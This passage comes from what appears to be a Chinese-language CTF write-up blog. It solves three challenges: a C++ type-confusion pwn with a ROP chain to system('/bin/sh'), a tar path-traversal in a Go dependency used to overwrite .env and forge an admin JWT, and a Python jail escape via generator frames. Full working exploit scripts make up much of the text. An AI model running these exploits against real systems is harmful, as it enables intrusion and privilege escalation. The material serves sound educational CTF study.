    strncpy(certificate, generateRandomString(<span class="number">16</span>).c_str(), MAX_DATA_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    virtual void gender() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;The certificate is &quot;</span> &lt;&lt; certificate &lt;&lt; <span class="string">&#x27;x00&#x27;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    char certificate[MAX_DATA_LEN + <span class="number">0x10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Girl</span>: public Baby &#123;</span><br><span class="line">public:</span><br><span class="line">    Girl() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;A girl was born&quot;</span> &lt;&lt; endl;</span><br><span class="line">        certificate = [](const char* <span class="built_in">str</span>) &#123; puts(<span class="built_in">str</span>); &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual void gender() &#123;</span><br><span class="line">        string s = <span class="string">&quot;The certificate is &quot;</span> + generateRandomString(<span class="number">16</span>) + <span class="string">&#x27;x00&#x27;</span>;</span><br><span class="line">        certificate(s.c_str());</span><br><span class="line">    &#125;</span><br><span class="line">    void (*certificate)(const char*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中Boy类的certificate的类型是char字符串，而Girl类中的certificate是函数指针。</p>
<p>因此当选择Femboy或者Tomboy时就会产生类型混淆。其中当选择Tomboy时，由于直接把Girl类型直接转化为Boy类型，因此识别到的certificate是Boy类中的char字符串，而后续实际调用的gender方法是Girl类的（即会把certificate当成函数指针调用）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">static void choose(Baby* baby) &#123;</span><br><span class="line">    string s = typeid(*baby).name();</span><br><span class="line">    char choice;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="string">&quot;3Boy&quot;</span>) &#123;</span><br><span class="line">   // <span class="keyword">pass</span> it</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( s == <span class="string">&quot;4Girl&quot;</span>) &#123;</span><br><span class="line">        menu(baby);</span><br><span class="line">        cin &gt;&gt; choice;</span><br><span class="line">        switch (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;</span><br><span class="line">                // <span class="keyword">pass</span> it</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;</span><br><span class="line">                string buf;</span><br><span class="line">                Boy* tomboy = static_cast&lt;Boy*&gt;(baby);</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;If you think you are a boy, please leave your gender certificate&quot;</span> &lt;&lt; endl;</span><br><span class="line">                cin &gt;&gt; buf;</span><br><span class="line">                strncpy(tomboy-&gt;certificate, buf.c_str(), MAX_DATA_LEN); // 此处certificate会被识别为Boy类的char*类型，因此不会报错</span><br><span class="line">                tomboy-&gt;gender(); // 这里会识别为Gril类的gender实现方法</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            default: &#123;</span><br><span class="line">                // <span class="keyword">pass</span> it</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是意味着我们可以修改一个函数指针并调用它。程序里预留了一个gender栈溢出漏洞函数，可以修改certificate为这个函数地址实现调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void gender() &#123;</span><br><span class="line">        char buf[MAX_DATA_LEN];</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;If you think you are a shopping bag, please leave your gender certificate&quot;</span> &lt;&lt; endl;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序没有开PIE和Canary，且开头给出了libc上的地址，在IDA中查看buf，可以获取需要填充的偏移量：</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">0000000000000010</span> <span class="comment">// Use data definition commands to manipulate stack variables and arguments.</span></span><br><span class="line">-<span class="number">0000000000000010</span> <span class="comment">// Frame size: 10; Saved regs: 8; Purge: 0</span></span><br><span class="line">-<span class="number">0000000000000010</span></span><br><span class="line">-<span class="number">0000000000000010</span>     <span class="variable">_BYTE</span> buf[<span class="number">16</span>];</span><br><span class="line">+<span class="number">0000000000000000</span>     <span class="variable">_QWORD</span> <span class="variable">__saved_registers</span>;</span><br><span class="line">+<span class="number">0000000000000008</span>     <span class="variable">_UNKNOWN</span> *<span class="variable">__return_address</span>;</span><br><span class="line">+<span class="number">0000000000000010</span></span><br><span class="line">+<span class="number">0000000000000010</span> <span class="comment">// end of stack variables</span></span><br></pre></td></tr></table></figure>

<p>高版本的栈溢出rop链寻找比较麻烦，这里给出一条针对此题的rop链：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">0x000000000040391a</span> : <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">8</span>] <span class="comment">; pop rbp ; ret</span></span><br><span class="line"># <span class="number">0x0000000000402fcc</span> : <span class="keyword">pop</span> <span class="built_in">rbx</span> <span class="comment">; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"># <span class="number">0x000000000040201a</span> : <span class="keyword">ret</span></span><br><span class="line"># <span class="number">0x0000000000403476</span> : <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rax</span> <span class="comment">; call rbx</span></span><br></pre></td></tr></table></figure>

<p>通过[rbp -8] -&gt; rax -&gt; rdi可以实现控制第一个参数，而通过控制rbx可以控制要调用的函数。</p>
<p>我们将rbx控制为system地址，[rbp-8]控制为&#x2F;bin&#x2F;sh地址就可以实现调用system(“&#x2F;bin&#x2F;sh”)方法了，而要控制[rbp-8]需要在libc上找到一个调用&#x2F;bin&#x2F;sh地址的地址，再将old_rbp填充为这个地址+8的值，最后执行完leave后，rbp的地址就会变成这个地址+8的值。</p>
<p>通过IDA利用libc.so.6查找&#x2F;bin&#x2F;sh的交叉引用可以找的0x201500这个偏移：</p>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:00000000002014FC                 db    0</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:00000000002014FD                 db    0</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:00000000002014FE                 db    0</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:00000000002014FF                 db    0</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201500 off_201500      dq offset aBinSh        ; <span class="type">DATA</span> <span class="type">XREF</span>: sub_110F20+<span class="type">C3</span>↑r</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201500                                         ; sub_110F20+7B1↑r</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201500                                         ; &quot;/bin/sh&quot;</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201508                 align 20h</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201520 off_201520      dq offset off_201560    ; <span class="type">DATA</span> <span class="type">XREF</span>: argp_parse+406↑o</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201520                                         ; &quot;version&quot;</span></span><br><span class="line">.<span class="class"><span class="keyword">data</span>.rel.ro:0000000000201528                 dq offset sub_134960</span></span><br></pre></td></tr></table></figure>

<p>编写exp即可获取flag：</p>
<p>完整的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64</span><br><span class="line"> </span><br><span class="line">target_info = &#123;</span><br><span class="line">    <span class="string">&#x27;exec_path&#x27;</span>: <span class="string">&#x27;./pwn&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;elf_info&#x27;</span>: ELF(<span class="string">&#x27;./pwn&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;libc_info&#x27;</span>: ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(target_info[&#x27;exec_path&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b *0x40262E&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">setvbuf = &#123;</span><br><span class="line">    <span class="string">&#x27;got&#x27;</span> : <span class="built_in">int</span>(io.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">&#125;</span><br><span class="line">log.info(<span class="string">f&#x27;setvbuf@got: <span class="subst">&#123;<span class="built_in">hex</span>(setvbuf[<span class="string">&quot;got&quot;</span>])&#125;</span>&#x27;</span>)</span><br><span class="line">target_info[<span class="string">&#x27;libc_info&#x27;</span>].address = setvbuf[<span class="string">&#x27;got&#x27;</span>] - target_info[<span class="string">&#x27;libc_info&#x27;</span>].sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">log.info(<span class="string">f&#x27;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(target_info[<span class="string">&quot;libc_info&quot;</span>].address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = target_info[<span class="string">&#x27;libc_info&#x27;</span>].address + <span class="number">0x201500</span></span><br><span class="line">system = target_info[<span class="string">&#x27;libc_info&#x27;</span>].sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(target_info[<span class="string">&#x27;elf_info&#x27;</span>].sym[<span class="string">&#x27;_Z6genderv&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Girln&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Tomboyn&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;certificaten&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts = &#123;</span><br><span class="line">    <span class="string">&#x27;plt&#x27;</span>: target_info[<span class="string">&#x27;elf_info&#x27;</span>].plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;got&#x27;</span>: target_info[<span class="string">&#x27;elf_info&#x27;</span>].got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(binsh+<span class="number">8</span>) + p64(<span class="number">0x000000000040391a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x0000000000402fcc</span>) + p64(system) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x000000000040201a</span>) + p64(<span class="number">0x0000000000403476</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;certificaten&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040391a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000402fcc : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000040201a : ret</span></span><br><span class="line"><span class="comment"># 0x0000000000403476 : mov rdi, rax ; call rbx</span></span><br></pre></td></tr></table></figure>

<h2 id="Gotar"><a href="#Gotar" class="headerlink" title="Gotar"></a>Gotar</h2><a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/Gotar_f81a08b1efe5dbb2865f4da4fd9c4c38.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>漏洞点位于whyrusleeping&#x2F;tar-utils依赖库</p>
<p>审计源码，可以发现tar-utils依赖的outputPath函数存在目录遍历漏洞</p>
<p>首先，函数将 tarPath 按照斜杠（&#x2F;）分割成多个元素 然后，移除第一个元素（通常是根目录） 接着，将这些元素重新组合成一个路径字符串 最后，将这个路径基于 Extractor 的 Path 属性进行重定位</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e0aa8a4c9d.png"></p>
<p>通过上述分析，可以构造恶意路径如:exp&#x2F;..&#x2F;exp.txt 经过outputPath函数处理后，最终路径位..&#x2F;exp.txt 实现目录遍历漏洞</p>
<p>分析调用，extractDir、extractSymlink、extractFile三个函数都调用了outputPath</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e0ac6e9646.png"></p>
<p>本题中controllers&#x2F;file.go:96处的extractTar调用了该依赖库实现解压tar包，因此存在目录遍历漏洞</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e0ae453a1e.png"></p>
<p>构造恶意tar包即可实现任意文件写入</p>
<p>exp1</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> <span class="built_in">exp</span></span><br><span class="line">echo <span class="string">&quot;hack&quot;</span> &gt; <span class="built_in">exp</span>/secret.txt</span><br><span class="line">tar --create --file=hack.tar --<span class="built_in">transform</span> &#x27;s,<span class="built_in">exp</span>/,<span class="built_in">exp</span>/../,&#x27; <span class="built_in">exp</span>/secret.txt```</span><br></pre></td></tr></table></figure>

<p>进一步利用</p>
<p>题目使用jwt进行鉴权，jwt通过随机生成的密钥存在.env中，思考是否能覆盖.env实现越权</p>
<p>题目巧合的在LoginHandler处加载了环境遍历（默认读取.env），因此可以实现覆盖.env文件修改jwt密钥</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e0b183e52e.png"></p>
<p>最终exp</p>
<p>exp<code>python3 exp.py 127.0.0.1:80</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length</span>):</span><br><span class="line">    letters = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>(<span class="params">session, method, path, data=<span class="literal">None</span>, files=<span class="literal">None</span>, headers=<span class="literal">None</span></span>):</span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;session.url&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">    response = session.request(method, url, data=data, files=files, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8083&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_jwt</span>(<span class="params">user_id, is_admin, jwt_key</span>):</span><br><span class="line">    expiration_time = datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">24</span>)</span><br><span class="line">    claims = &#123;</span><br><span class="line">        <span class="string">&#x27;UserID&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;IsAdmin&#x27;</span>: is_admin,</span><br><span class="line">        <span class="string">&#x27;exp&#x27;</span>: expiration_time</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(claims, jwt_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_malicious_tar</span>():</span><br><span class="line">    <span class="comment"># Create the directory and .env file</span></span><br><span class="line">    os.makedirs(<span class="string">&#x27;exp&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp/.env&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;JWT_SECRET=hack&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the tar file with the path traversal</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&#x27;hack.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        tar.add(<span class="string">&#x27;exp/.env&#x27;</span>, arcname=<span class="string">&#x27;exp/../../../.env&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url, token</span>):</span><br><span class="line">    payload = <span class="string">&quot;echo `cat /flag` &gt; /var/www/html/public/flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.url = url</span><br><span class="line"></span><br><span class="line">    random_string = generate_random_string(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    user_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: random_string,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: random_string</span><br><span class="line">    &#125;</span><br><span class="line">    response1 = send_request(session, <span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/register&#x27;</span>, data=user_data)</span><br><span class="line">    <span class="keyword">if</span> response1.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Failed to register&quot;</span></span><br><span class="line">    response2 = send_request(session, <span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>, data=user_data)</span><br><span class="line">    <span class="keyword">if</span> response2.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Failed to login&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hack.tar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: f&#125;</span><br><span class="line">        response3 = send_request(session, <span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/upload&#x27;</span>, files=files)</span><br><span class="line">        <span class="keyword">if</span> response3.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failed to upload malicious tar file&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Malicious tar file uploaded successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 触发加载环境变量</span></span><br><span class="line">    send_request(session, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;token=<span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response4 = send_request(session, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/download/1&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response4.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    create_malicious_tar()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Malicious tar file created: hack.tar&quot;</span>)</span><br><span class="line"></span><br><span class="line">    jwt_key = <span class="string">&quot;hack&quot;</span></span><br><span class="line">    user_id = <span class="number">1</span></span><br><span class="line">    is_admin = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    token = generate_jwt(user_id, is_admin, jwt_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Generated JWT:&quot;</span>, token)</span><br><span class="line"></span><br><span class="line">    URL = sys.argv[<span class="number">1</span>]</span><br><span class="line">    flag = exp(URL, token)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h1><h2 id="python-jail"><a href="#python-jail" class="headerlink" title="python jail"></a>python jail</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/jail.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<details class="toggle" ><summary class="toggle-button" style="">点击展开原题代码python文件</summary><div class="toggle-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">BOX = [randint(<span class="number">1</span>, <span class="number">9999</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Give me your solve:&quot;</span>)</span><br><span class="line">user_input = <span class="built_in">input</span>().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    user_code = base64.b64decode(user_input).decode()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid base64 input&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(user_code) &lt;= <span class="number">121</span>, <span class="string">&quot;Input exceeds maximum allowed length&quot;</span></span><br><span class="line"></span><br><span class="line">exec_globals = &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">exec_locals = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">exec</span>(user_code, exec_globals, exec_locals)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s = exec_locals.get(<span class="string">&quot;s&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> s == BOX:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Incorrect&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div></details>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">a</span>():<span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back.f_back</span><br><span class="line"> g=a();g=[x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>];<span class="keyword">return</span> g.f_globals[<span class="string">&#x27;BOX&#x27;</span>]</span><br><span class="line">s=b()</span><br></pre></td></tr></table></figure>

<p>然后改一下弄成base64就好了</p>
